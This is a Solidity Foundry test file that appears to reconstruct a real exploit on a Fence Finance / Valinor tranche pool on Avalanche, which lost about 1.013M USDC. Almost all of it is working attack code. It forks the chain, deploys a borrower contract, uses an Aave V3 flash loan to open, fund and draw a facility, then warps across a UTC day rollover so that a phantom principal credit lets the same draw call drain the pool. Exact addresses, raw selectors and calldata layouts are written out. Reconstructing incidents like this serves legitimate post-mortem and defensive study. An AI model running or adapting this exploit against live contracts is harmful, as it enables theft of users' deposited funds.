// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~1.013M USD (1,013,353.611686 USDC)
// Attacker EOA : https://snowtrace.io/address/0x6ff1c3ffa622e1062168f3497a275be9cc2b1246
// Attacker helper contract : https://snowtrace.io/address/0xf09dcf4ede2a88bd316ff355dfc333a281a57805
// Victim TranchePool : https://snowtrace.io/address/0xe25cb545bdd47a8ec2d08001cb5661b00d47621a
// Facility/strategy contract : https://snowtrace.io/address/0x0e710a20376ae1e18316b0a270889d665a6918b2
// First draw (open + fund + draw, 23:56:41 UTC) : https://snowtrace.io/tx/0x19ab145e7f771549ca2f1da4b1768d7f728834015b2480ddb5be19c9769899fd
// Second draw (identical calldata, 00:00:03 UTC) : https://snowtrace.io/tx/0x3f6b23292a2e9c2956c7ac56d0b1f79b0271b49edec2156d2675ddf1de058c77
//
// @Summary
// A Valinor Digital / Fence Finance tranche pool on Avalanche settles each UTC day by treating a
// scheduled principal payment as received: at the day rollover it subtracts that amount from the
// borrower's outstanding principal without any USDC actually being repaid. draw() checks the
// requested amount against funded principal minus outstanding principal, so the phantom reduction
// restores draw capacity that was already spent.
//
// The borrower side is permissionless. A fresh account opens a facility against the pool, names
// itself as the borrower, funds the principal with an Aave V3 flash loan and draws it straight back
// out in one go. The flash loan is repaid inside the same call, so that first cycle is net zero and
// leaves outstanding == funded. One UTC day later the settlement credits the scheduled principal as
// paid, outstanding drops back toward zero, and the identical draw() call succeeds a second time -
// this time pulling the pool's own standing liquidity. No admin role, whitelist or onboarding is
// involved on the borrower path; the only protocol pieces the attacker touches (the pool and the
// facility contract) are read as inherited fork state.
//
// Reconstruction below forks one block before the first draw, deploys a brand-new borrower contract
// from a fresh EOA, opens/configures/funds the facility naming this contract as the borrower, runs
// the flash-loaned first cycle, warps across the UTC midnight boundary (day index 20753 -> 20754),
// and draws the identical amount a second time, draining the pool. The only value the test injects
// is the Aave flash-loan premium (~506.68 USDC), the attacker's own capital: the on-chain helper
// was pre-funded with exactly premium + 1 wei before the first draw. Here it is sourced from a
// forked USDC holder, not minted. The 1.013M taken out is the pool's real liquidity.
//
// Interface note: the pool is unverified on Snowtrace and its selectors are absent from the public
// 4byte / openchain signature databases, so no function names or exact scalar widths are available.
// The calls below are therefore typed against the argument layout decoded from the two on-chain draw
// transactions: every parameter is passed as a named, typed value (the borrower address is an
// explicit field, not a byte rewrite), and each call is dispatched with the raw 4-byte selector it
// carried on-chain. The typed arguments reproduce the captured calldata of both transactions
// byte-for-byte; only the human-readable function names are unknown.

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint128);
}

// Facility descriptor as it appears, identically, in every pool call captured from the two draws.
// Field names reflect the role each slot plays in the traces; slots whose meaning could not be
// recovered from the unverified pool are named by their observed constant. All scalar slots are
// typed uint256, which reproduces the on-chain calldata exactly regardless of the pool's real width.
struct Facility {
    address strategy; // 0x0e71.. facility / strategy contract
    address borrower; // borrower (attacker-controlled; set to the exploit contract)
    address asset; // USDC
    uint256 assetDecimals; // 6 (== USDC decimals)
    address recipient; // draw recipient (== borrower)
    uint256 slot5; // 0
    uint256 slot6; // 0
    uint256 slot7; // 1
    uint256 slot8; // 0
    uint256 slot9; // 0
    uint256 slot10; // 1e18 config constant
    uint256 slot11; // 1e18 config constant
    uint256 slot12; // 0
}

contract FenceTranchePool_exp is Test {
    IERC20 constant USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    address constant POOL = 0xE25CB545Bdd47a8Ec2d08001cb5661B00D47621a;
    IAavePool constant AAVE = IAavePool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    // aAvaUSDC aToken, a forked USDC holder used only to supply the attacker's flash-loan premium.
    address constant USDC_SOURCE = 0x625E7708f30cA75bfd92586e17077590C60eb4cD;

    // Draw amount taken on-chain (== the pool's standing liquidity).
    uint256 constant DRAW_AMOUNT = 1_013_353_611_686;

    // Fork block 98731442 = 2026-10-27 23:56:40 UTC, day index (ts / 86400) = 20753.
    uint256 constant FORK_BLOCK = 98_731_442;
    // First multiple of 86400 that lands in day index 20754 == 2026-10-28 00:00:00 UTC, +3s to match tx2.
    uint256 constant DAY_ROLLOVER_TS = 20_754 * 86_400 + 3;

    function setUp() public {
        vm.createSelectFork("avalanche", FORK_BLOCK);
    }

    function testExploit() public {
        assertEq(USDC.balanceOf(POOL), DRAW_AMOUNT, "pool should hold its full standing liquidity pre-attack");

        (address attacker, Borrower borrower) = _deployAndFlashCycle1();

        assertEq(USDC.balanceOf(POOL), DRAW_AMOUNT, "pool liquidity unchanged after cycle 1");
        assertEq(USDC.balanceOf(address(borrower)), 0, "flash loan repaid in full, premium spent");

        // Cross the UTC day boundary so the phantom settlement credits the scheduled principal.
        vm.warp(DAY_ROLLOVER_TS);

        // Cycle 2: the identical draw() call, no new flash loan. Drains the pool.
        vm.prank(attacker);
        borrower.drawAgain();

        uint256 stolen = USDC.balanceOf(address(borrower));
        console.log("USDC drained from pool :", stolen);
        console.log("Pool USDC balance after :", USDC.balanceOf(POOL));

        assertEq(stolen, DRAW_AMOUNT, "second draw was paid with the pool's own liquidity");
        assertEq(USDC.balanceOf(POOL), 0, "pool fully drained");
    }

    // Negative control: without crossing the UTC day boundary, the second draw has no restored
    // capacity and reverts. The rollover is the trigger, not an unbounded draw.
    function testSecondDrawRevertsWithoutRollover() public {
        (address attacker, Borrower borrower) = _deployAndFlashCycle1();

        vm.prank(attacker);
        vm.expectRevert();
        borrower.drawAgain();

        assertEq(USDC.balanceOf(POOL), DRAW_AMOUNT, "pool untouched when the day has not rolled over");
    }

    // Fresh EOA deploys a fresh borrower (no role or whitelist), supplies only the Aave premium as
    // the attacker's own capital, and runs the net-zero flash-loaned first cycle.
    function _deployAndFlashCycle1() internal returns (address attacker, Borrower borrower) {
        attacker = makeAddr("attacker");
        vm.prank(attacker);
        borrower = new Borrower();

        uint256 premium = (DRAW_AMOUNT * AAVE.FLASHLOAN_PREMIUM_TOTAL() + 5000) / 10_000;
        vm.prank(USDC_SOURCE);
        USDC.transfer(address(borrower), premium);

        vm.prank(attacker);
        borrower.flashDrawCycle1();
    }
}

// Fresh, unprivileged borrower. Flash-loans the setup principal from Aave V3, then opens, configures,
// funds and draws the facility with itself named as the borrower. Every pool interaction is a typed
// call: the Facility argument is built here with this contract's address in the borrower/recipient
// slots, and each call is sent with the selector observed on-chain for that step.
contract Borrower {
    address constant POOL = 0xE25CB545Bdd47a8Ec2d08001cb5661B00D47621a;
    address constant STRATEGY = 0x0e710A20376ae1e18316B0A270889d665a6918b2;
    IERC20 constant USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IAavePool constant AAVE = IAavePool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    uint256 constant DRAW_AMOUNT = 1_013_353_611_686;
    uint256 constant CONFIG_SCALE = 1e18; // slot10 / slot11 config constant seen in every call
    // Scheduled settlement day set by the finalize-config call: 0x6ae13b00 == 2026-10-28 00:00:00 UTC,
    // the UTC boundary the pool's phantom principal credit fires on.
    uint256 constant SCHEDULE_DAY = 0x6ae13b00;

    // Pool entry-point selectors observed in the two on-chain draw transactions. The pool is
    // unverified and absent from public signature databases, so these are carried as raw selectors;
    // the typed arguments passed with each (below) reproduce the captured calldata byte-for-byte.
    bytes4 constant OPEN_FACILITY = 0xb1f70fbc; // open facility, naming this contract the borrower
    bytes4 constant CONFIGURE = 0x200634ba; // configure the freshly opened facility
    bytes4 constant FUND_PRINCIPAL = 0xcec66073; // fund the principal (transferFrom borrower -> pool)
    bytes4 constant FINALIZE_CONFIG = 0x2d02d600; // final facility setup before the first draw
    bytes4 constant DRAW = 0x8e27c105; // draw(); identical arguments for both the first and second draw

    // The Facility descriptor for every call, with this contract as borrower and draw recipient.
    function _facility() internal view returns (Facility memory f) {
        f.strategy = STRATEGY;
        f.borrower = address(this);
        f.asset = address(USDC);
        f.assetDecimals = 6;
        f.recipient = address(this);
        f.slot7 = 1;
        f.slot10 = CONFIG_SCALE;
        f.slot11 = CONFIG_SCALE;
    }

    function _openFacility() internal {
        _send(
            abi.encodeWithSelector(
                OPEN_FACILITY,
                _facility(),
                uint256(0),
                uint256(0),
                uint256(512),
                uint256(0),
                uint256(0),
                uint256(0),
                uint256(128),
                uint256(0)
            )
        );
    }

    function _configure() internal {
        _send(abi.encodeWithSelector(CONFIGURE, uint256(1), _facility(), DRAW_AMOUNT));
    }

    function _fundPrincipal() internal {
        _send(abi.encodeWithSelector(FUND_PRINCIPAL, uint256(1), _facility(), DRAW_AMOUNT));
    }

    function _finalizeConfig() internal {
        _send(
            abi.encodeWithSelector(
                FINALIZE_CONFIG, _facility(), uint256(1), SCHEDULE_DAY, DRAW_AMOUNT, uint256(0), uint256(0)
            )
        );
    }

    // draw(amount, [facility], asset, [1], [1e18], borrower, recipient). Identical arguments each call.
    function _draw() internal {
        Facility[] memory facilities = new Facility[](1);
        facilities[0] = _facility();
        uint256[] memory arrOne = new uint256[](1);
        arrOne[0] = 1;
        uint256[] memory arrScale = new uint256[](1);
        arrScale[0] = CONFIG_SCALE;
        _send(
            abi.encodeWithSelector(
                DRAW, DRAW_AMOUNT, facilities, address(USDC), arrOne, arrScale, address(this), address(this)
            )
        );
    }

    // Cycle 1: borrow the setup principal from Aave V3. The open/fund/draw happens in the callback.
    function flashDrawCycle1() external {
        AAVE.flashLoanSimple(address(this), address(USDC), DRAW_AMOUNT, "", 0);
    }

    // Aave V3 flash-loan callback. Open the facility as borrower, fund the principal, draw it back
    // out (net zero), then leave amount + premium approved for Aave to pull on return.
    function executeOperation(address, uint256 amount, uint256 premium, address, bytes calldata)
        external
        returns (bool)
    {
        USDC.approve(POOL, type(uint256).max);
        _openFacility();
        _configure();
        _fundPrincipal();
        _finalizeConfig();
        _draw();
        USDC.approve(address(AAVE), amount + premium);
        return true;
    }

    // Cycle 2: identical draw() after the UTC rollover, no flash loan needed.
    function drawAgain() external {
        _draw();
    }

    function _send(bytes memory data) internal {
        (bool ok,) = POOL.call(data);
        require(ok, "pool call reverted");
    }

    // The pool calls back into the borrower during config and draw (selectors 0xe9e6e950,
    // 0x85b40b16, 0x717505a9) and requires each to approve the step by returning true. The
    // attacker's helper returned 1 for all of them; a fresh contract does the same.
    fallback() external {
        assembly {
            mstore(0x00, 0x01)
            return(0x00, 0x20)
        }
    }
}
